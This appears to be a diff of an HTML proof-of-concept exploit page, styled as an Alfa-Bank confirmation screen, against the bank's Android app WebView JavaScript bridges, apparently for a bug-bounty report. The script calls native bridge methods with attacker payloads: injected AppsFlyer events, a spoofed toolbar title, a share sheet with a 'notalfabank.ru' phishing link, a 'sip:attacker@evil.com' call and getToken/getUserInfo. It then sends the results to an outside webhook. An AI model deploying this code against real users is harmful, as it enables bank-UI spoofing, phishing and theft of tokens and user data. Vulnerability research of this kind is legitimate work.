@@ -3,112 +3,88 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Альфа-Банк — Подтверждение</title>
+<title>Альфа-Банк — Подтверждение операции</title>
 <style>
-body { font-family: -apple-system, sans-serif; padding: 24px; background:#fff; }
-.logo { color: #EF3124; font-weight: 700; font-size: 24px; margin-bottom: 16px; }
-.box { background: #f5f5f5; padding: 16px; border-radius: 8px; margin: 12px 0; font-size: 13px; }
+body { font-family: -apple-system, sans-serif; padding: 16px; background:#fff; margin:0; }
+.logo { color: #EF3124; font-weight: 700; font-size: 24px; margin-bottom: 8px; }
+h2 { font-size: 18px; }
+.box { background: #f5f5f5; padding: 12px; border-radius: 8px; margin: 8px 0; font-size: 11px; }
 .ok { color: #00aa00; font-weight: 600; }
 .err { color: #cc0000; }
-pre { white-space: pre-wrap; word-break: break-all; font-size: 12px; }
+pre { white-space: pre-wrap; word-break: break-all; font-size: 10px; }
 </style>
 </head>
 <body>
 <div class="logo">α-Bank</div>
-<h2>Bridge PoC — #55169</h2>
-<div id="status" class="box">Initializing...</div>
+<h2>Bridge Invocation PoC — #55169</h2>
+<div id="status" class="box">Running probes...</div>
 
 <script>
 const results = {
     location: location.href,
-    referrer: document.referrer,
-    userAgent: navigator.userAgent,
-    timestamp: new Date().toISOString(),
-    bridges: {}
+    bridges_present: {},
+    method_invocations: {}
 };
 
-// Probe all possible bridge namespaces
-const bridgeNames = ['Android', 'AndroidSdk', 'webViewBridge', 'D3SJS', 'jsBridge', 'appInterface', 'AlfaJSBridge'];
+// Bridge namespaces
+const bridgeNames = ['Android', 'AndroidSdk', 'webViewBridge', 'D3SJS', 'jsBridge', 'appInterface'];
 
 for (const name of bridgeNames) {
-    const bridge = window[name];
-    if (bridge !== undefined) {
-        const info = {
-            type: typeof bridge,
-            keys: [],
-            methods_callable: []
-        };
+    if (typeof window[name] !== 'undefined') {
+        results.bridges_present[name] = typeof window[name];
+    }
+}
+
+// Try invoking each expected method even if not enumerable
+const methodsToProbe = [
+    {name: 'sendEventToAppsFlyer', payload: '{"eventName":"PoC_BRIDGE_INJECTED","eventValues":{"poc":"true"}}'},
+    {name: 'setPageSettings', payload: '{"pageId":"poc","pageTitle":"ATTACKER_INJECTED"}'},
+    {name: 'handleError', payload: ['0','poc_id','poc_text']},
+    {name: 'shareData', payload: ['PoC Title','PoC Desc','https://notalfabank.ru/icon.png','https://notalfabank.ru/phish_target']},
+    {name: 'openCallScreen', payload: ['sip:attacker@evil.com']},
+    {name: 'getToken', payload: []},
+    {name: 'getUserInfo', payload: []},
+    {name: 'postMessage', payload: ['{"type":"PoC","data":"injected"}']},
+    {name: 'close', payload: []},
+    {name: 'onPageLoaded', payload: []}
+];
+
+if (window.Android) {
+    for (const probe of methodsToProbe) {
+        const m = probe.name;
+        const before = typeof window.Android[m];
+        const r = {existed_before: before};
         try {
-            info.keys = Object.keys(bridge);
-        } catch(e) { info.keys_err = e.toString(); }
-        try {
-            // Object.getOwnPropertyNames lists non-enum too — get all JavascriptInterface methods
-            info.own = Object.getOwnPropertyNames(bridge);
-        } catch(e) { info.own_err = e.toString(); }
-        try {
-            // Try methods we know about from decompiled bridges
-            const methods = ['sendEventToAppsFlyer', 'setPageSettings', 'handleError', 'shareData', 'openCallScreen', 'getToken', 'getUserInfo', 'postMessage'];
-            for (const m of methods) {
-                if (typeof bridge[m] === 'function') {
-                    info.methods_callable.push(m);
-                }
+            if (Array.isArray(probe.payload)) {
+                window.Android[m].apply(window.Android, probe.payload);
+            } else {
+                window.Android[m](probe.payload);
             }
-        } catch(e) { info.methods_err = e.toString(); }
-        results.bridges[name] = info;
+            r.invocation = "OK_NO_THROW";
+            r.result_callable = true;
+        } catch(e) {
+            r.exception = e.toString();
+            // Java exception = bridge dispatched, native code threw → method EXISTS on bridge
+            r.result_callable = e.toString().includes('Java exception was raised') ? true : 'partial';
+        }
+        results.method_invocations[m] = r;
     }
 }
 
-// Try invoking sendEventToAppsFlyer with attacker payload
-if (window.Android && typeof window.Android.sendEventToAppsFlyer === 'function') {
-    try {
-        const payload = '{"eventName":"PoC_55169_INJECTED","eventValues":{"attacker":"true","timestamp":"' + Date.now() + '"}}';
-        window.Android.sendEventToAppsFlyer(payload);
-        results.appsFlyerInvoked = "OK — no exception thrown";
-    } catch(e) {
-        results.appsFlyerInvoked_err = e.toString();
-    }
-}
+// Final: render in DOM
+const summary = {
+    bridge_exposed: Object.keys(results.bridges_present),
+    callable_methods: Object.keys(results.method_invocations).filter(m => 
+        results.method_invocations[m].result_callable === true),
+    detail: results
+};
 
-// Try setPageSettings — UI title spoof
-if (window.Android && typeof window.Android.setPageSettings === 'function') {
-    try {
-        const payload = '{"pageId":"poc","pageTitle":"⚠️ATTACKER_TITLE_INJECTED⚠️"}';
-        window.Android.setPageSettings(payload);
-        results.setPageSettingsInvoked = "OK — check if alfa toolbar title changed";
-    } catch(e) {
-        results.setPageSettingsInvoked_err = e.toString();
-    }
-}
+document.getElementById('status').innerHTML = '<pre>' + JSON.stringify(summary, null, 2) + '</pre>';
 
-// Try handleError no-op (case 0)
-if (window.Android && typeof window.Android.handleError === 'function') {
-    try {
-        window.Android.handleError(0, "poc_id", "poc_text");
-        results.handleErrorInvoked = "OK";
-    } catch(e) {
-        results.handleError_err = e.toString();
-    }
-}
+// Exfil to webhook
+fetch('https://webhook.site/echo?test=55169v2&data=' + encodeURIComponent(JSON.stringify(summary).substring(0, 2000)), {mode:'no-cors'}).catch(e => {});
 
-// Try shareData — case 1, fires Intent.ACTION_SEND (Gq1.a)
-if (window.Android && typeof window.Android.shareData === 'function') {
-    try {
-        window.Android.shareData("PoC Title", "PoC Description", "https://notalfabank.ru/icon.png", "https://notalfabank.ru/phish_target");
-        results.shareDataInvoked = "OK — share-sheet should pop";
-    } catch(e) {
-        results.shareData_err = e.toString();
-    }
-}
-
-// Display in DOM
-document.getElementById('status').innerHTML = '<pre>' + JSON.stringify(results, null, 2) + '</pre>';
-
-// Exfil to webhook.site (free service for capturing requests)
-const beacon = 'https://webhook.site/token/echo?test=55169&data=' + encodeURIComponent(JSON.stringify(results).substring(0, 1800));
-fetch(beacon, {method: 'GET', mode: 'no-cors'}).catch(e => {});
-
-// Update title — visible if setPageSettings didn't work
-document.title = 'BRIDGE_TEST: ' + Object.keys(results.bridges).join(',');
+document.title = 'CALLABLE: ' + summary.callable_methods.join(',');
 </script>
 </body>
 </html>
